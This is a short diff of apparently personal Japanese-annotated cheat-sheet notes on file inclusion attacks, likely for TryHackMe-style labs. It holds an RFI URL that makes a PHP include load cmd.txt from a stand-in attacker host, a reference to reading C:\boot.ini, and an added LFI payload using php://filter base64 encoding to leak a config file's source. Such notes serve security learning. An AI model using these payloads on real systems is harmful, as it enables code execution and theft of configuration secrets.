@@ -19,4 +19,5 @@ C:\boot.ini #BIOSファームウェアを搭載したコンピュータのブー
 #RFI
 http://webapp.thm/index.php?lang=http://attacker.thm/cmd.txt #include関数に攻撃者のサーバのファイルを実行させる
 
-
+#LFI
+http://<IP>/?page=php://filter/convert.base64-encode/resource=config #URL入力しても何も表示されないとき、base64でエンコードして見れるかも
